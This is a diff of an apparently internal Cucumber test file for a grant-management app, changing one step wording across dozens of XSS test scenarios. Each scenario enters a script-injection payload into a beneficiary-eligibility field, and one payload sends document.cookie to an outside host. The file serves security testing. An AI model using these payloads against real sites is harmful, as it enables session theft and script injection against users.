       | <script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script> | fieldBeneficiaryEligibility__c |
@@ -3350,7 +3350,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                  | Field                          |
       | <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script> | fieldBeneficiaryEligibility__c |
@@ -3375,7 +3375,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                          |
       | <script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script> | fieldBeneficiaryEligibility__c |
@@ -3400,7 +3400,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                          |
       | <script>location='javascript:alert\x281\x29'</script> | fieldBeneficiaryEligibility__c |
@@ -3425,7 +3425,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                          |
       | <script>location=name</script> | fieldBeneficiaryEligibility__c |
@@ -3450,7 +3450,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                     | Field                          |
       | <script>alert`1`</script> | fieldBeneficiaryEligibility__c |
@@ -3475,7 +3475,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                               | Field                          |
       | <script>new Function`X${document.location.hash.substr`1`}`</script> | fieldBeneficiaryEligibility__c |
@@ -3500,7 +3500,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                             | Field                          |
       | <script>Function`X${document.location.hash.substr`1`}```</script> | fieldBeneficiaryEligibility__c |
@@ -3525,7 +3525,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                          |
       | <video><source onerror=location=/\02.rs/+document.cookie> | fieldBeneficiaryEligibility__c |
@@ -3550,7 +3550,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                | Field                          |
       | <svg onload=alert(1) | fieldBeneficiaryEligibility__c |
@@ -3575,7 +3575,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                    | Field                          |
       | <svg onload=alert(1)<!-- | fieldBeneficiaryEligibility__c |
@@ -3600,7 +3600,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                          |
       | <script>throw[onerror]=[alert],1</script> | fieldBeneficiaryEligibility__c |
@@ -3625,7 +3625,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                          |
       | <script>var{a:onerror}={a:alert};throw 1</script> | fieldBeneficiaryEligibility__c |
@@ -3650,7 +3650,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                              | Field                          |
       | <script>var{haha:onerror=alert}=0;throw 1</script> | fieldBeneficiaryEligibility__c |
@@ -3675,7 +3675,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                          |
       | <script>window.name='javascript:alert(1)';</script><svg onload=location=name> | fieldBeneficiaryEligibility__c |
@@ -3700,7 +3700,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                          |
       | <xss class=progress-bar-animated onanimationstart=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -3725,7 +3725,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                   | Field                          |
       | <xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss> | fieldBeneficiaryEligibility__c |
@@ -3750,7 +3750,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                          |
       | <iframe src="javascript:alert(1)"> | fieldBeneficiaryEligibility__c |
@@ -3775,7 +3775,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                          |
       | <object data="javascript:alert(1)"> | fieldBeneficiaryEligibility__c |
@@ -3800,7 +3800,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <embed src="javascript:alert(1)"> | fieldBeneficiaryEligibility__c |
@@ -3825,7 +3825,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                          |
       | <a href="javascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -3850,7 +3850,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                          |
       | <a href="JaVaScript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -3875,7 +3875,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                          |
       | <a href=" 	javascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -3900,7 +3900,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                          |
       | <a href="javas	cript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -3925,7 +3925,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                          |
       | <a href="javascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -3950,7 +3950,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                          |
       | <svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a> | fieldBeneficiaryEligibility__c |
@@ -3975,7 +3975,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                  | Field                          |
       | <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldBeneficiaryEligibility__c |
@@ -4000,7 +4000,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                     | Field                          |
       | <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a> | fieldBeneficiaryEligibility__c |
@@ -4025,7 +4025,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                 | Field                          |
       | <svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldBeneficiaryEligibility__c |
@@ -4050,7 +4050,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                          |
       | <script src="data:text/javascript,alert(1)"></script> | fieldBeneficiaryEligibility__c |
@@ -4075,7 +4075,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                          |
       | <svg><script href="data:text/javascript,alert(1)" /> | fieldBeneficiaryEligibility__c |
@@ -4100,7 +4100,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                             | Field                          |
       | <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg> | fieldBeneficiaryEligibility__c |
@@ -4125,7 +4125,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                          |
       | <script>import('data:text/javascript,alert(1)')</script> | fieldBeneficiaryEligibility__c |
@@ -4150,7 +4150,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                           | Field                          |
       | <base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a> | fieldBeneficiaryEligibility__c |
@@ -4175,7 +4175,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                          |
       | <math><x href="javascript:alert(1)">blah | fieldBeneficiaryEligibility__c |
@@ -4200,7 +4200,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                          |
       | <form><button formaction=javascript:alert(1)>XSS | fieldBeneficiaryEligibility__c |
@@ -4225,7 +4225,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                          |
       | <form><input type=submit formaction=javascript:alert(1) value=XSS> | fieldBeneficiaryEligibility__c |
@@ -4250,7 +4250,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                          |
       | <form action=javascript:alert(1)><input type=submit value=XSS> | fieldBeneficiaryEligibility__c |
@@ -4275,7 +4275,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                      | Field                          |
       | <svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a> | fieldBeneficiaryEligibility__c |
@@ -4300,7 +4300,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | <a href="javascript://%0aalert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -4325,7 +4325,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                          | Field                          |
       | <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg> | fieldBeneficiaryEligibility__c |
@@ -4350,7 +4350,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                 | Field                          |
       | <svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /> | fieldBeneficiaryEligibility__c |
@@ -4375,7 +4375,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                        | Field                          |
       | <svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x /> | fieldBeneficiaryEligibility__c |
@@ -4400,7 +4400,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                          |
       | <embed code=https://portswigger-labs.net width=500 height=500 type=text/html> | fieldBeneficiaryEligibility__c |
@@ -4425,7 +4425,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                           | Field                          |
       | <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net> | fieldBeneficiaryEligibility__c |
@@ -4450,7 +4450,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                            | Field                          |
       | <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net> | fieldBeneficiaryEligibility__c |
@@ -4475,7 +4475,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                          |
       | <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net> | fieldBeneficiaryEligibility__c |
@@ -4500,7 +4500,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                           | Field                          |
       | <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net> | fieldBeneficiaryEligibility__c |
@@ -4525,7 +4525,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                           | Field                          |
       | <script>location.protocol='javascript'</script> | fieldBeneficiaryEligibility__c |
@@ -4550,7 +4550,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                          |
       | <a href="%0aalert(1)" onclick="protocol='javascript'">test</a> | fieldBeneficiaryEligibility__c |
@@ -4575,7 +4575,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                          |
       | <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe> | fieldBeneficiaryEligibility__c |
@@ -4600,7 +4600,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                         | Field                          |
       | <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe> | fieldBeneficiaryEligibility__c |
@@ -4625,7 +4625,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                      | Field                          |
       | <form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label> | fieldBeneficiaryEligibility__c |
@@ -4650,7 +4650,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                      | Field                          |
       | <input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldBeneficiaryEligibility__c |
@@ -4675,7 +4675,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                         | Field                          |
       | <link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldBeneficiaryEligibility__c |
@@ -4700,7 +4700,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                       | Field                          |
       | <a href=# download="filename.html">Test</a> | fieldBeneficiaryEligibility__c |
@@ -4725,7 +4725,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                          |
       | <img referrerpolicy="no-referrer" src="//portswigger-labs.net"> | fieldBeneficiaryEligibility__c |
@@ -4750,7 +4750,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                | Field                          |
       | <a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -4775,7 +4775,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                        | Field                          |
       | <iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe> | fieldBeneficiaryEligibility__c |
@@ -4800,7 +4800,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                           | Field                          |
       | <base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a> | fieldBeneficiaryEligibility__c |
@@ -4825,7 +4825,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                  | Field                          |
       | <a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a> | fieldBeneficiaryEligibility__c |
@@ -4850,7 +4850,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                | Field                          |
       | <img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map> | fieldBeneficiaryEligibility__c |
@@ -4875,7 +4875,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                     | Field                          |
